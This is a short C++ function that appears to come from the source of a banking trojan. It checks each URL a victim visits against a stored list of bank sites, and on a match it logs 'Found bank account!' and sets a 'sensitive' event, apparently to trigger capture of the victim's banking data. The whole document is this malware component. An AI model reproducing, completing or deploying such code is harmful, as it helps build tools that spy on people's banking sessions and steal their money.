void bank::_matchBank(LPSTR url)
{
	
	DWORD size = Str::_LengthA(url);
	if(url != NULL && !isBlank())
	{
		CWA(kernel32, EnterCriticalSection)(&csupd);
		LPSTR curItem = urls;
		do
		{
		  if(Str::_findSubStringA(url,curItem))
		  {
			WDEBUG0(WDDT_INFO, "Found bank account!");
			CWA(kernel32, SetEvent)(sensetiveHandle);
			break;
		  }
		}
		while((curItem = Str::_multiStringGetIndexA(curItem, 1)) != NULL);
		CWA(kernel32, LeaveCriticalSection)(&csupd);
	}
}